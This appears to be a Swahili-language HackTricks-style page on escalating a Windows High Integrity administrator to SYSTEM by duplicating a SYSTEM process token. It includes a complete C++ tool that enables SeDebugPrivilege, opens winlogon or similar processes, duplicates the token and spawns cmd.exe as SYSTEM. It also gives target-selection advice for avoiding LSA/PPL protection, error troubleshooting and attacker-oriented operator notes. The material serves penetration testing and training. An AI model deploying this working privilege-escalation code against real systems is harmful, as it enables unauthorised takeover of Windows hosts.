# SeImpersonate kutoka High hadi System

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unahusu toleo la **manual** la kutoka kwenye **High Integrity administrator process** hadi **`NT AUTHORITY\SYSTEM`** kwa **kufungua SYSTEM process isiyolindwa, kunakili token yake, na kuanzisha child process kwa kutumia token hiyo**.

Ikiwa una **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** pekee lakini **huwezi kufungua SYSTEM process inayofaa**, njia ya **Potato / named-pipe** huwa ya kuaminika zaidi:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Ikiwa unachotaka si `SYSTEM` pekee bali ni **SYSTEM token yenye privileges nyingi iwezekanavyo**, pia angalia:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Triage ya haraka

Kabla ya kujaribu kuiba token, thibitisha kwa haraka context:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Maelezo ya kiutendaji:

- Token ya admin yenye **High Integrity** kwa kawaida inatosha **kuwezesha `SeDebugPrivilege`** na kufungua michakato mingi ya SYSTEM isiyolindwa.
- **`CreateProcessWithTokenW` inahitaji `SeImpersonatePrivilege`** kwenye caller. Ikiwa API hiyo itashindwa na `1314`, tumia `CreateProcessAsUserW` baada ya kuwa tayari ume-duplicate token ya msingi ya SYSTEM.
- Kwenye Windows za kisasa, **`lsass.exe` mara nyingi si target nzuri** kwa sababu **LSA protection / PPL** huzuia access hata kwa administrators walio na `SeDebugPrivilege`. Pendelea **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, au **`svchost.exe`** ya awali inayoendeshwa kama SYSTEM.
- Si kila process ya SYSTEM ina token yenye manufaa sawa. Ukipata SYSTEM lakini ukaona privileges zimepungua, jaribu process nyingine ya SYSTEM badala ya kudhani technique imeharibika.

## Chagua PID kwa uangalifu

Njia rahisi zaidi ya kufanya hili lifanye kazi kwa uhakika ni **kuchagua process ya SYSTEM ambayo DACL yake inaruhusu Administrators ku-query process na ku-duplicate token yake**.

Candidates wazuri wa kujaribu kwanza:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- baadhi ya instances za awali za `svchost.exe` zinazoendeshwa kama SYSTEM

Epuka kwa default:

- `lsass.exe` kwenye hosts ambazo **RunAsPPL / LSA protection** imewezeshwa
- processes zilizolindwa / nyeti kiusalama ambazo hurudisha `Access denied` hata baada ya kuwezesha `SeDebugPrivilege`

Unaweza kukagua processes candidates pamoja na token/ACL zao kwa kutumia **Process Explorer** au **Process Hacker** ikiwa inaendeshwa elevated.

### Code

Code ifuatayo inatoka kwenye [makala hii kuhusu access-token](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Inakubali **process ID kama argument** na kuanzisha command shell **kama mtumiaji** wa process hiyo.<sup>[[3]](#references)</sup>\
Ukiendesha ndani ya process yenye High Integrity unaweza **kuonyesha PID ya process inayoendeshwa kama System** (kama `winlogon`, `wininit`) na kutekeleza `cmd.exe` kama SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Vidokezo muhimu kuhusu API / access-right

Mfano unatumia `MAXIMUM_ALLOWED`, lakini kwa operations halisi ni muhimu kukumbuka vipengele vya chini vinavyohusika:

- `OpenProcessToken()` inahitaji tu kwamba **process handle** iwe imefunguliwa kwa `**PROCESS_QUERY_LIMITED_INFORMATION**`.
- Ili kutumia `CreateProcessWithTokenW()`, **primary token handle** lazima iwe na `**TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY**`.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` lazima iunde **primary token** (`TokenPrimary`), si token ya impersonation pekee.
- Ikiwa tayari umefanya impersonate ya SYSTEM na `CreateProcessWithTokenW()` bado inashindwa kwa `1314`, jaribu kutumia `CreateProcessAsUserW()` badala yake.

Hii inamaanisha kwamba **kufungua target process kwa `PROCESS_ALL_ACCESS` kwa kawaida si lazima na kunaweza kuleta kelele zaidi**, badala ya kuomba tu rights zinazohitajika ili ku-query token.

## Hitilafu

Wakati fulani unaweza kujaribu kufanya impersonate ya System na isifanye kazi, huku ikionyesha output kama ifuatayo:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Hii inamaanisha kwamba hata kama unaendesha kwenye kiwango cha **High Integrity**, **huna permissions za kutosha** juu ya process/token hiyo lengwa.\
Hebu tuchunguze permissions za sasa za Administrator juu ya processes za `svchost.exe` kwa kutumia **Process Explorer** (au unaweza pia kutumia **Process Hacker**):

1. Chagua process ya `svchost.exe`
2. Bofya kulia --> Properties
3. Ndani ya kichupo cha "Security", bofya kitufe cha "Permissions" kilicho chini kulia
4. Bofya "Advanced"
5. Chagua "Administrators" na ubofye "Edit"
6. Bofya "Show advanced permissions"

![Code - Hitilafu: 6. Bofya "Show advanced permissions"](<../../images/image (437).png>)

Picha iliyotangulia ina privileges zote ambazo "Administrators" wanazo juu ya process iliyochaguliwa (kama unavyoona kwa `svchost.exe`, wana privileges za "Query" pekee)

Angalia privileges ambazo "Administrators" wanazo juu ya `winlogon.exe`:

![Code - Hitilafu: Angalia privileges ambazo "Administrators" wanazo juu ya winlogon.exe](<../../images/image (1102).png>)

Ndani ya process hiyo, "Administrators" wanaweza "Read Memory" na "Read Permissions", jambo ambalo huenda linawaruhusu Administrators ku-impersonate token inayotumiwa na process hii.

### Sababu za kawaida za kushindwa

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: DACL ya process inakuzuia, au target ni **protected/PPL**. Chagua process nyingine ya SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: handle ya token yako ilifunguliwa bila rights za kutosha, au DACL ya target token inazuia duplication.
- **`CreateProcessWithTokenW()` -> `1314`**: caller hana **`SeImpersonatePrivilege`** iliyowashwa kwa sasa. Jaribu kuiwasha kwanza au tumia `CreateProcessAsUserW()` pamoja na duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** baada ya failures zilizotangulia: mara nyingi hii inamaanisha tu kwamba hatua ya awali ya token duplication/impersonation ilishindwa, kwa hiyo hakuna primary token inayoweza kutumika kuanzisha child process.

## Operator notes

- Technique hii ni nzuri unapokuwa tayari **local admin + high integrity** na unataka tu njia ya haraka, ya manual, ya kupata SYSTEM bila kuanzisha service au chain ya named-pipe coercion.
- Kwenye mazingira yaliyohardeniwa ya Windows 11 / Server, **LSA protection inazidi kuwa ya kawaida**, kwa hiyo workflow inayodhani kwamba `lsass.exe` inaweza kusomeka kila wakati si thabiti. **`winlogon.exe` / `wininit.exe` / `services.exe` kwa kawaida ni chaguo bora za kwanza**.<sup>[[2]](#references)</sup>
- Ukiingia kwenye context ya **service account** badala ya elevated admin desktop, **Potato family** kwa kawaida inafaa zaidi kuliko ukurasa huu.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Kutumia vibaya tokens za Windows kuhatarisha Active Directory bila kugusa LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Kuelewa na Kutumia Vibaya Process Tokens — Sehemu ya II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
